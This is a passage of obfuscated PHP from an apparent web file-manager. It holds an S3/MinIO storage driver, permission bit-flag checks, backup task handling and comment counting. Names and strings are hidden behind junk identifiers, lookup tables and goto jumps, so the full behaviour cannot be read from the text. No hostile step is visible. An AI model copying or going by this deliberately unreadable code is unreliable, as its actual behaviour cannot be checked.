$_SERVER[óÔë„ú]; $§›±©¶ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ûõ‚¸¨¤[70], $ûõ‚¸¨¤[64], $ûõ‚¸¨¤[69], $ûõ‚¸¨¤[62]))) { return $§›±©¶ . $ûõ‚¸¨¤[8] . $this->bucket; } $§›±©¶ = explode($ûõ‚¸¨¤[210], $§›±©¶); return $§›±©¶[0] . $ûõ‚¸¨¤[210] . $this->bucket . $ûõ‚¸¨¤[10] . $§›±©¶[1]; } public function size($ª®ÀßÚÃ) { $™úèª‹ = $this->objectMeta($ª®ÀßÚÃ); return $™úèª‹ ? $™úèª‹[$_SERVER[óÔë„ú][79]] : 0; } public function info($›ó‚€èÔ) { if ($this->isFolder($›ó‚€èÔ)) { return $this->folderInfo($›ó‚€èÔ); } else { if ($this->isFile($›ó‚€èÔ)) { return $this->fileInfo($›ó‚€èÔ); } } return !1; } public function exist($ò×¡”ÊÎ) { return $this->isFile($ò×¡”ÊÎ) || $this->isFolder($ò×¡”ÊÎ); } public function isFile($‚÷´ĞÆ³) { return !$this->isFolder($‚÷´ĞÆ³) && $this->objectMeta($‚÷´ĞÆ³); } public function isFolder($÷±ÈøêÍ) { return $this->cacheMethod($_SERVER[óÔë„ú][179], $÷±ÈøêÍ); } protected function objectMeta($ÍéŸ£) { return $this->cacheMethod($_SERVER[óÔë„ú][181], $ÍéŸ£); } protected function _objectMeta($£Íó¯) { $ÍüØ°Ş¤ =& $_SERVER[óÔë„ú]; $£Íó¯ = rtrim($£Íó¯, $ÍüØ°Ş¤[8]); try { $Ù¢Ê‚…¹ = $this->client->getObjectInfo($this->bucket, $£Íó¯); if (!isset($Ù¢Ê‚…¹[$ÍüØ°Ş¤[252]]) && isset($Ù¢Ê‚…¹[$ÍüØ°Ş¤[268]])) { $Ù¢Ê‚…¹[$ÍüØ°Ş¤[252]] = $Ù¢Ê‚…¹[$ÍüØ°Ş¤[268]]; } } catch (Exception $¨ªä²½ª) { $Ù¢Ê‚…¹ = !1; } if (!$Ù¢Ê‚…¹) { } return $Ù¢Ê‚…¹; } protected function _isFolder($ö¬º¸Õ) { $š°ˆ¹¼ =& $_SERVER[óÔë„ú]; $ö¬º¸Õ = rtrim($ö¬º¸Õ, $š°ˆ¹¼[8]); if ($ö¬º¸Õ == $š°ˆ¹¼[12] || $ö¬º¸Õ == $š°ˆ¹¼[8]) { return !0; } $ıãÑ¶Ûö = $this->client->getBucket($this->bucket, $ö¬º¸Õ, null, 1); if (empty($ıãÑ¶Ûö[$š°ˆ¹¼[236]])) { return !1; } $óí×©°› = $ıãÑ¶Ûö[$š°ˆ¹¼[236]][0][$š°ˆ¹¼[32]]; return stripos($óí×©°›, $ö¬º¸Õ . $š°ˆ¹¼[8]) === 0 ? !0 : !1; if (substr($óí×©°›, -1) == $š°ˆ¹¼[8]) { return !0; } if (get_path_this($óí×©°›) == get_path_this($ö¬º¸Õ)) { return !1; } return !0; } public function listObject($ÄÄˆœ¦Œ) { return $this->fileList($ÄÄˆœ¦Œ, $_SERVER[óÔë„ú][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Šá×ı‚é) { $½ÂÉ’® =& $_SERVER[óÔë„ú]; parent::__construct($Šá×ı‚é); $this->setSignVersion($½ÂÉ’®[247]); if (!$this->region) { $this->region = $½ÂÉ’®[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÁûÒá°† = $this->getBucketRgn(); return $this->region == $ÁûÒá°† ? !0 : !1; } public function uploadFormData($Ïã˜›Ú, $¯İÕ°‹¼ = 3600) { $¸¡Š¦ü¸ =& $_SERVER[óÔë„ú]; $’ÅŸõ¢ª = $¸¡Š¦ü¸[229]; $ÛıóÀĞ = $¸¡Š¦ü¸[270]; $¶‘”ô¶’ = $¸¡Š¦ü¸[62]; $‘¿¨¶Éç = gmdate($¸¡Š¦ü¸[271]); $¬Œ¸û¹° = gmdate($¸¡Š¦ü¸[272]); $äÁ‡Ò»ó = $¸¡Š¦ü¸[273]; $ŒÙ™¢Ã¡ = $¯İÕ°‹¼ . $¸¡Š¦ü¸[12]; $øêï·ú = $¸¡Š¦ü¸[274]; $ì±‰òç” = array($this->accessKey, $¬Œ¸û¹°, $this->region, $¶‘”ô¶’, $äÁ‡Ò»ó); $Éàê¸öÔ = implode($¸¡Š¦ü¸[8], $ì±‰òç”); $ÌõÅ™ñã = array($¸¡Š¦ü¸[275] => gmdate($¸¡Š¦ü¸[276], strtotime($¸¡Š¦ü¸[277])), $¸¡Š¦ü¸[278] => array(array($¸¡Š¦ü¸[279] => $this->bucket), array($¸¡Š¦ü¸[280] => $’ÅŸõ¢ª), array($¸¡Š¦ü¸[281], $¸¡Š¦ü¸[282], $¸¡Š¦ü¸[12]), array($¸¡Š¦ü¸[281], $¸¡Š¦ü¸[283], $¸¡Š¦ü¸[12]), array($¸¡Š¦ü¸[281], $¸¡Š¦ü¸[284], $¸¡Š¦ü¸[12]), array($¸¡Š¦ü¸[285] => $øêï·ú), array($¸¡Š¦ü¸[286] => $Éàê¸öÔ), array($¸¡Š¦ü¸[287] => $ÛıóÀĞ), array($¸¡Š¦ü¸[288] => $‘¿¨¶Éç), array($¸¡Š¦ü¸[289] => $ŒÙ™¢Ã¡))); $İüÛ“÷ó = base64_encode(json_encode($ÌõÅ™ñã)); $İøÄˆ­° = hash_hmac($¸¡Š¦ü¸[290], $¬Œ¸û¹°, $¸¡Š¦ü¸[291] . $this->secret, !0); $¡ˆÙÂåè = hash_hmac($¸¡Š¦ü¸[290], $this->region, $İøÄˆ­°, !0); $çãÏç— = hash_hmac($¸¡Š¦ü¸[290], $¶‘”ô¶’, $¡ˆÙÂåè, !0); $şÑ¾„Ñ¿ = hash_hmac($¸¡Š¦ü¸[290], $äÁ‡Ò»ó, $çãÏç—, !0); $Œ’¹Š˜Á = hash_hmac($¸¡Š¦ü¸[290], $İüÛ“÷ó, $şÑ¾„Ñ¿); $É¸ÌË¦› = array($¸¡Š¦ü¸[246] => $¸¡Š¦ü¸[12], $¸¡Š¦ü¸[292] => $¸¡Š¦ü¸[12], $¸¡Š¦ü¸[280] => $’ÅŸõ¢ª, $¸¡Š¦ü¸[285] => $øêï·ú, $¸¡Š¦ü¸[293] => $İüÛ“÷ó, $¸¡Š¦ü¸[294] => $Éàê¸öÔ, $¸¡Š¦ü¸[295] => $ÛıóÀĞ, $¸¡Š¦ü¸[296] => $‘¿¨¶Éç, $¸¡Š¦ü¸[297] => $ŒÙ™¢Ã¡, $¸¡Š¦ü¸[298] => $Œ’¹Š˜Á, $¸¡Š¦ü¸[208] => $this->getHost()); return $É¸ÌË¦›; } } goto B˜¼®”Õå“; EØƒ˜©æÚ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $àÓ¼îƒ† =& $_SERVER[óÔë„ú]; $çÈ¼œ­¿ = array(array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1958]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1960], $àÓ¼îƒ†[1961] => 1, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1964]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1965], $àÓ¼îƒ†[1961] => 2, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1966]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1967], $àÓ¼îƒ†[1961] => 3, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1968]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1969], $àÓ¼îƒ†[1961] => 4, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => self::AUTH_SHOW | self::AUTH_VIEW), array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1970]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1971], $àÓ¼îƒ†[1961] => 5, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1972]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1973], $àÓ¼îƒ†[1961] => 6, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($àÓ¼îƒ†[494] => LNG($àÓ¼îƒ†[1974]), $àÓ¼îƒ†[1959] => $àÓ¼îƒ†[1975], $àÓ¼îƒ†[1961] => 7, $àÓ¼îƒ†[1962] => 1, $àÓ¼îƒ†[1963] => 0)); return $çÈ¼œ­¿; } public static function authCheck($íÁÜ”®, $Ï½áâµÊ) { $ßå°÷Ÿ =& $_SERVER[óÔë„ú]; $íÁÜ”® = intval($íÁÜ”®); if (KodUser::isRoot() && $GLOBALS[$ßå°÷Ÿ[6]][$ßå°÷Ÿ[1976]]) { return !0; } if ($íÁÜ”® <= 0) { return !1; } if (($íÁÜ”® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($íÁÜ”® & $Ï½áâµÊ); } public static function authCheckShow($şü¦¸Úî) { return self::authCheck($şü¦¸Úî, self::AUTH_SHOW); } public static function authCheckView($‚ø¦š„Ê) { return self::authCheck($‚ø¦š„Ê, self::AUTH_VIEW); } public static function authCheckDownload($‡ÜÔ·Ì) { return self::authCheck($‡ÜÔ·Ì, self::AUTH_DOWNLOAD); } public static function authCheckUpload($±á‹®Æ±) { return self::authCheck($±á‹®Æ±, self::AUTH_UPLOAD); } public static function authCheckEdit($“™Ù¾½Ñ) { return self::authCheck($“™Ù¾½Ñ, self::AUTH_EDIT); } public static function authCheckRemove($ĞûˆöÆ) { return self::authCheck($ĞûˆöÆ, self::AUTH_REMOVE); } public static function authCheckShare($‹Ê ¬Âå) { return self::authCheck($‹Ê ¬Âå, self::AUTH_SHARE); } public static function authCheckComment($øéÆõ¿) { return self::authCheck($øéÆõ¿, self::AUTH_COMMENT); } public static function authCheckEvent($¥Òô÷Ò) { return self::authCheck($¥Òô÷Ò, self::AUTH_EVENT); } public static function authCheckRoot($™àŠ³Øâ) { return self::authCheck($™àŠ³Øâ, self::AUTH_ROOT); } public static function authCheckAction($®Ã‚ÈË, $ÉÆá†«¾) { $ƒ—¤ÃÖç =& $_SERVER[óÔë„ú]; $ÏÛĞô¥‚ = array($ƒ—¤ÃÖç[1977] => self::AUTH_VIEW, $ƒ—¤ÃÖç[1266] => self::AUTH_DOWNLOAD, $ƒ—¤ÃÖç[110] => self::AUTH_UPLOAD, $ƒ—¤ÃÖç[1926] => self::AUTH_EDIT, $ƒ—¤ÃÖç[1925] => self::AUTH_REMOVE, $ƒ—¤ÃÖç[1936] => self::AUTH_SHARE, $ƒ—¤ÃÖç[430] => self::AUTH_COMMENT, $ƒ—¤ÃÖç[1746] => self::AUTH_EVENT, $ƒ—¤ÃÖç[1978] => self::AUTH_ROOT); if (!isset($ÏÛĞô¥‚[$ÉÆá†«¾])) { return; } $•‘¹†É = $ÏÛĞô¥‚[$ÉÆá†«¾]; $®Ã‚ÈË = intval($®Ã‚ÈË); if ($®Ã‚ÈË <= 0) { return !1; } if (($®Ã‚ÈË & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($®Ã‚ÈË & $•‘¹†É); } public static function authDisable($Ú±şßÃ©, $•™›™£Õ) { if (intval($Ú±şßÃ©) <= 0) { return 0; } return intval($Ú±şßÃ©) & ~$•™›™£Õ; } public $optionType = "\x53\171\x73\164\x65\155\x2e\163\157\165\x72\x63\x65\x41\x75\x74\150\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\141\165\164\150", "\154\x61\x62\145\154", "\144\151\x73\160\x6c\141\171", "\163\x79\163\164\145\155", "\163\x6f\162\x74"); public function initData() { $“Óš¥ò¶ = $this->authDefault(); foreach ($“Óš¥ò¶ as $Ô«é§ÔØ) { $this->add($Ô«é§ÔØ); } } public function findAuth($¼ÎÙ¹Á, $šõªÈ£) { $àş¶ëÆŸ =& $_SERVER[óÔë„ú]; $¿¤èôŒş = parent::listData(); foreach ($¿¤èôŒş as $½öõıÜû) { $Æ«Ú¸İŒ = intval($½öõıÜû[$àş¶ëÆŸ[487]]); if ($Æ«Ú¸İŒ <= 0 || $½öõıÜû[$àş¶ëÆŸ[1979]] == 0) { continue; } if (($Æ«Ú¸İŒ & $¼ÎÙ¹Á) != $¼ÎÙ¹Á) { continue; } if (($Æ«Ú¸İŒ & $šõªÈ£) != 0) { continue; } return $½öõıÜû[$àş¶ëÆŸ[475]]; } return !1; } public function findAuthReadOnly() { $×è©ÀØŠ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $úşµµ‰ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($×è©ÀØŠ, $úşµµ‰); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Øİ»®ÚÏ =& $_SERVER[óÔë„ú]; $¡ö›—¼‰ = parent::listData(); $ÎïÜ¬¥Ó = !1; foreach ($¡ö›—¼‰ as $¥”˜ïô) { if ($¥”˜ïô[$Øİ»®ÚÏ[487]] <= 0 || $¥”˜ïô[$Øİ»®ÚÏ[1979]] == $Øİ»®ÚÏ[228]) { continue; } if (!$ÎïÜ¬¥Ó) { $ÎïÜ¬¥Ó = $¥”˜ïô; continue; } if ($ÎïÜ¬¥Ó[$Øİ»®ÚÏ[487]] > $¥”˜ïô[$Øİ»®ÚÏ[487]]) { $ÎïÜ¬¥Ó = $¥”˜ïô; } } return $ÎïÜ¬¥Ó ? $ÎïÜ¬¥Ó[$Øİ»®ÚÏ[475]] : $Øİ»®ÚÏ[12]; } public function listData($÷ëÓ‘÷’ = false, $•õÁê¸ = "\x73\x6f\162\x74", $×Ù‘Š÷Ñ = false) { return parent::listData($÷ëÓ‘÷’, $•õÁê¸, $×Ù‘Š÷Ñ); } public function update($¥ò‹™¾½, $©¨Öñ) { $»¾®ì¨Ö =& $_SERVER[óÔë„ú]; $…áåÖøå = parent::listData($¥ò‹™¾½); $Ğ¥ÂÌÌ¼ = $this->findByName($©¨Öñ[$»¾®ì¨Ö[32]]); if (!$…áåÖøå || $Ğ¥ÂÌÌ¼ && $Ğ¥ÂÌÌ¼[$»¾®ì¨Ö[475]] != $…áåÖøå[$»¾®ì¨Ö[475]]) { return !1; } $this->filterAuth($©¨Öñ[$»¾®ì¨Ö[487]]); return parent::update($¥ò‹™¾½, $©¨Öñ); } public function remove($Ûßïáñ ) { $’ØÜ‘§ç = parent::listData($Ûßïáñ ); if (!$’ØÜ‘§ç || $’ØÜ‘§ç[$_SERVER[óÔë„ú][191]]) { return !1; } return parent::remove($Ûßïáñ ); } public function add($»×•Íš¿ = array()) { $ÃÃ«…ÀÌ =& $_SERVER[óÔë„ú]; if ($this->findByName($»×•Íš¿[$ÃÃ«…ÀÌ[32]])) { return !1; } $Í»²÷åæ = array($ÃÃ«…ÀÌ[32] => $ÃÃ«…ÀÌ[12], $ÃÃ«…ÀÌ[487] => 1, $ÃÃ«…ÀÌ[1980] => $ÃÃ«…ÀÌ[1967], $ÃÃ«…ÀÌ[1979] => 1, $ÃÃ«…ÀÌ[191] => 0, $ÃÃ«…ÀÌ[1981] => 0); $»×•Íš¿ = array_merge($Í»²÷åæ, $»×•Íš¿); $»×•Íš¿[$ÃÃ«…ÀÌ[1981]] = $this->getSort(); $this->filterAuth($»×•Íš¿[$ÃÃ«…ÀÌ[487]]); return parent::insert($»×•Íš¿); } private function getSort() { $Â¸ñŠ¯ª =& $_SERVER[óÔë„ú]; $ËÙÉÈø = parent::listData(); $‚ÚÍåâ½ = array_to_keyvalue($ËÙÉÈø, $Â¸ñŠ¯ª[12], $Â¸ñŠ¯ª[1981]); return empty($‚ÚÍåâ½) ? 0 : max($‚ÚÍåâ½) + 1; } private function filterAuth(&$™ª¦ä´) { if (!$™ª¦ä´) { return; } $Íªšğ¹Ä = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Í¢ÍÏì‡ = array(); foreach ($Íªšğ¹Ä as $Š‹æĞÌñ) { if ($™ª¦ä´ & $Š‹æĞÌñ) { $Í¢ÍÏì‡[] = $Š‹æĞÌñ; } } if (in_array(self::AUTH_ROOT, $Í¢ÍÏì‡)) { $™ª¦ä´ = array_sum($Íªšğ¹Ä); return; } $¢Â¤–“‚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Í¢ÍÏì‡ as $Š‹æĞÌñ) { if (isset($¢Â¤–“‚[$Š‹æĞÌñ])) { $Í¢ÍÏì‡ = array_merge($Í¢ÍÏì‡, $¢Â¤–“‚[$Š‹æĞÌñ]); } } $Í¢ÍÏì‡[] = self::AUTH_SHOW; $™ª¦ä´ = array_sum(array_unique($Í¢ÍÏì‡)); } public function sort($‚¸Ä©é, $‰µÀ¡) { return parent::update($‚¸Ä©é, $‰µÀ¡); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\142\x61\143\x6b\x75\160\x4c\151\163\164"; public $field = array("\x69\x6f", "\x6e\x61\x6d\145", "\163\164\141\x74\x75\x73", "\143\x6f\x6e\164\145\x6e\164", "\x6d\x61\156\165\x61\154", "\162\145\x73\x75\154\x74", "\x74\151\155\x65\x46\162\157\x6d", "\x74\151\155\x65\124\157"); public function config() { $¿’¡Øå˜ =& $_SERVER[óÔë„ú]; Action($¿’¡Øå˜[1982])->taskInit(); $†£¿Ÿøá = Model($¿’¡Øå˜[830])->get($¿’¡Øå˜[843]); $†£¿Ÿøá = json_decode($†£¿Ÿøá, !0); $†£¿Ÿøá = is_array($†£¿Ÿøá) ? $†£¿Ÿøá : array(); $this->parseContent($†£¿Ÿøá); unset($†£¿Ÿøá[$¿’¡Øå˜[1728]]); Model($¿’¡Øå˜[1727])->cacheClear(); $ÒÖ»ÒÄâ = $¿’¡Øå˜[1983]; $İÁëº¾ô = Model($¿’¡Øå˜[1984])->findByKey($¿’¡Øå˜[1746], $ÒÖ»ÒÄâ); if (!$İÁëº¾ô) { $İÁëº¾ô = array(); } if (isset($İÁëº¾ô[$¿’¡Øå˜[206]])) { $İÁëº¾ô[$¿’¡Øå˜[206]] = json_decode($İÁëº¾ô[$¿’¡Øå˜[206]], !0); } if (isset($†£¿Ÿøá[$¿’¡Øå˜[206]])) { $İÁëº¾ô[$¿’¡Øå˜[206]][$¿’¡Øå˜[1731]] = $†£¿Ÿøá[$¿’¡Øå˜[206]]; unset($†£¿Ÿøá[$¿’¡Øå˜[206]]); } return array_merge($İÁëº¾ô, $†£¿Ÿøá); } public function listData($ì¥°‘ò = false, $øşÓ–ø¸ = "\155\x6f\144\x69\x66\x79\124\151\155\x65", $Ãè½ŒÏ” = false) { $Ùó¿¼‘ò = parent::listData($ì¥°‘ò, $øşÓ–ø¸, !0); if (!$Ùó¿¼‘ò) { return $Ùó¿¼‘ò; } if ($ì¥°‘ò) { $Ùó¿¼‘ò = array($Ùó¿¼‘ò); } foreach ($Ùó¿¼‘ò as &$“–û¬ä×) { $this->parseContent($“–û¬ä×); } return $ì¥°‘ò ? $Ùó¿¼‘ò[0] : $Ùó¿¼‘ò; } public function parseContent(&$ä‹…²•ê) { $÷–¨¶¹û =& $_SERVER[óÔë„ú]; $Ù‘Ø¤­¬ = _get($ä‹…²•ê, $÷–¨¶¹û[171], $÷–¨¶¹û[91]); if (!in_array($Ù‘Ø¤­¬, array($÷–¨¶¹û[836], $÷–¨¶¹û[1196]))) { $ä‹…²•ê[$÷–¨¶¹û[171]] = $Ù‘Ø¤­¬ == $÷–¨¶¹û[91] ? $÷–¨¶¹û[1196] : $÷–¨¶¹û[836]; } } public function lastItem() { $¯‹ïçÕò = $this->listData(); return !empty($¯‹ïçÕò[0]) ? $¯‹ïçÕò[0] : null; } public function kill($ıŸâÉú¬) { $”¾Ğ»šÇ =& $_SERVER[óÔë„ú]; $¤¥ŞÆŠ• = $this->listData($ıŸâÉú¬); if (!$¤¥ŞÆŠ• || empty($¤¥ŞÆŠ•[$”¾Ğ»šÇ[32]])) { return !0; } Task::kill($”¾Ğ»šÇ[842]); Task::kill($”¾Ğ»šÇ[860]); Task::kill($”¾Ğ»šÇ[869]); $°—¡ïŒ» = $¤¥ŞÆŠ•[$”¾Ğ»šÇ[32]]; $„éòûÈÀ = TEMP_FILES . $”¾Ğ»šÇ[839] . $°—¡ïŒ» . $”¾Ğ»šÇ[8]; IO::remove($„éòûÈÀ, !1); return $this->remove($ıŸâÉú¬); } public function remove($Şş’‡á) { $Ç­Ä‹êÅ = $this->listData($Şş’‡á); if (!$Ç­Ä‹êÅ) { return !0; } return $this->backupRemove($Ç­Ä‹êÅ); } private function backupRemove($À§Ãˆú„) { parent::remove($À§Ãˆú„[$_SERVER[óÔë„ú][475]]); $¾á¦½ê‘ = $this->backupPath($À§Ãˆú„); IO::remove($¾á¦½ê‘, !1); return !0; } private function backupPath($®Ã²¬§î) { $„×¡ı™ƒ =& $_SERVER[óÔë„ú]; $Ã³Í™ = $®Ã²¬§î[$„×¡ı™ƒ[32]]; $Óñ‰†àÏ = Model($„×¡ı™ƒ[830])->get($„×¡ı™ƒ[831]); $µõĞâ‚Ã = substr(md5($„×¡ı™ƒ[832] . $Óñ‰†àÏ . $Ã³Í™), 0, 8); return "\173\x69\157\72{$®Ã²¬§î[$„×¡ı™ƒ[812]]}\175\57\144\x61\164\x61\x62\x61\163\145\x2f\142\x61\x63\153\x75\x70\x2f" . $Ã³Í™ . $„×¡ı™ƒ[11] . $µõĞâ‚Ã; } public function start() { $Àœ‹­êª =& $_SERVER[óÔë„ú]; if ($GLOBALS[$Àœ‹­êª[6]][$Àœ‹­êª[92]][$Àœ‹­êª[1985]] != $Àœ‹­êª[91]) { return !0; } $¶‹€Œ– = $this->config(); if (!$¶‹€Œ– || $¶‹€Œ–[$Àœ‹­êª[1728]] != $Àœ‹­êª[91]) { return !1; } if ($¶‹€Œ–[$Àœ‹­êª[171]] == $Àœ‹­êª[836]) { $ÍõÖÓ±— = Model($Àœ‹­êª[830])->get($Àœ‹­êª[1311]); if ($ÍõÖÓ±— == $Àœ‹­êª[1312]) { $¶‹€Œ–[$Àœ‹­êª[171]] = $Àœ‹­êª[1196]; } } $ØŒßª°ö = $this->process(); foreach ($ØŒßª°ö as $‚Õ‚¸¬) { if ($‚Õ‚¸¬) { return Task::restart($‚Õ‚¸¬[$Àœ‹­êª[475]]); } } $­€‰¯İé = new Backup(); $ÍİñÄ›Æ = $­€‰¯İé->db(); if ($ÍİñÄ›Æ) { $ÍİñÄ›Æ = $­€‰¯İé->dbFile(); if ($ÍİñÄ›Æ && $¶‹€Œ–[$Àœ‹­êª[171]] == $Àœ‹­êª[836]) { $ÍİñÄ›Æ = $­€‰¯İé->file(); } } Backup::set(array($Àœ‹­êª[810] => 1, $Àœ‹­êª[821] => time())); return !0; } public function process() { $Éô®¥‚° =& $_SERVER[óÔë„ú]; $Œ×™äıÙ = array($Éô®¥‚°[817] => Task::get($Éô®¥‚°[842]), $Éô®¥‚°[822] => Task::get($Éô®¥‚°[860]), $Éô®¥‚°[230] => Task::get($Éô®¥‚°[869])); $÷ôá‰ºü = !1; foreach ($Œ×™äıÙ as &$­ÕØùæÇ) { if ($÷ôá‰ºü) { $­ÕØùæÇ = !1; continue; } if ($­ÕØùæÇ) { $Ï¸ãÍŞü = intval(_get($­ÕØùæÇ, $Éô®¥‚°[1763], 0)); if (time() - $Ï¸ãÍŞü > 7200) { Task::kill($­ÕØùæÇ[$Éô®¥‚°[475]]); $÷ôá‰ºü = !0; $­ÕØùæÇ = !1; } } } return $Œ×™äıÙ; } public function restore() { $³ï¾µâä =& $_SERVER[óÔë„ú]; ActionCall($³ï¾µâä[1123], !0, 1); ActionCall($³ï¾µâä[1123], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\x65\156\164"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\155\x65" => "\x63\x6f\x6d\x6d\x65\x6e\x74\x5f\155\x65\x74\141", "\x6d\x65\164\141\106\x69\x65\154\x64" => "\x63\157\x6d\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($…ŸŸàÌ¦) { $äÍãíÁ =& $_SERVER[óÔë„ú]; if ($…ŸŸàÌ¦[$äÍãíÁ[1986]]) { $ğï…‚«œ = $this->where(array($äÍãíÁ[1987] => $…ŸŸàÌ¦[$äÍãíÁ[1986]]))->find(); if (!$ğï…‚«œ || $ğï…‚«œ[$äÍãíÁ[190]] != $…ŸŸàÌ¦[$äÍãíÁ[190]] || $ğï…‚«œ[$äÍãíÁ[569]] != $…ŸŸàÌ¦[$äÍãíÁ[569]]) { return !1; } $this->where(array($äÍãíÁ[1987] => $…ŸŸàÌ¦[$äÍãíÁ[1986]]))->setAdd($äÍãíÁ[1988], 1); } $…ŸŸàÌ¦[$äÍãíÁ[1989]] = 0; $…ŸŸàÌ¦[$äÍãíÁ[1988]] = 0; $…ŸŸàÌ¦[$äÍãíÁ[810]] = 1; return $this->add($…ŸŸàÌ¦); } public function commentCount($«÷ì«—ë, $ëÉñ¾ÉÆ, $—¦áƒô = false) { $ÉùÚƒøß =& $_SERVER[óÔë„ú]; if (!$«÷ì«—ë) { return array(); } if (is_string($«÷ì«—ë) || is_int($«÷ì«—ë)) { $«÷ì«—ë = array($«÷ì«—ë); } $—‰İªş = array($ÉùÚƒøß[569], $ÉùÚƒøß[1990] => $ÉùÚƒøß[565]); $Å¨¡–—ñ = array($ÉùÚƒøß[569] => array($ÉùÚƒøß[7], $«÷ì«—ë), $ÉùÚƒøß[190] => $ëÉñ¾ÉÆ); if ($—¦áƒô) { $Å¨¡–—ñ[$ÉùÚƒøß[1758]] = $—¦áƒô; } $¼’¾ûÅı = $this->field($—‰İªş)->where($Å¨¡–—ñ)->group($ÉùÚƒøß[569])->select(); return array_to_keyvalue($¼’¾ûÅı, $ÉùÚƒøß[569], $ÉùÚƒøß[565]); } public function starTarget($™’Ô¤æ„, $êã¼«ºò) { $ºãçõ­ì =& $_SERVER[óÔë„ú]; $àÎ«´†¬ = $™’Ô¤æ„ + self::TYPE_STAR_OFFSET; $¯¤“È² = array($ºãçõ­ì[1758] => USER_ID, $ºãçõ­ì[190] => $àÎ«´†¬, $ºãçõ­ì[569] => $êã¼«ºò); $°‡§µ‡à = $this->where($¯¤“È²)->find(); if ($°‡§µ‡à) { return $this->where(array($ºãçõ­ì[475] => $°‡§µ‡à[$ºãçõ­ì[475]]))->delete(); } $¾á›áÚÛ = array($ºãçõ­ì[1986] => 0, $ºãçõ­ì[1758] => USER_ID, $ºãçõ­ì[810] => 1, $ºãçõ­ì[171] => $ºãçõ­ì[12], $ºãçõ­ì[190] => $àÎ«´†¬, $ºãçõ­ì[569] => $êã¼«ºò, $ºãçõ­ì[1989] => 0, $ºãçõ­ì[1988] => 0); return $this->add($¾á›áÚÛ); } public function starTargetCount($İöı¦”ø, $’âÒÀª†) { $áøÃ„ˆ =& $_SERVER[óÔë„ú]; $õÑô‹ = $’âÒÀª† + self::TYPE_STAR_OFFSET; $ªáÑæ¶ = $this->commentCount($İöı¦”ø, $õÑô‹); $ÍĞ¹•Ùà = $this->commentCount($İöı¦”ø, $õÑô‹, USER_ID); return 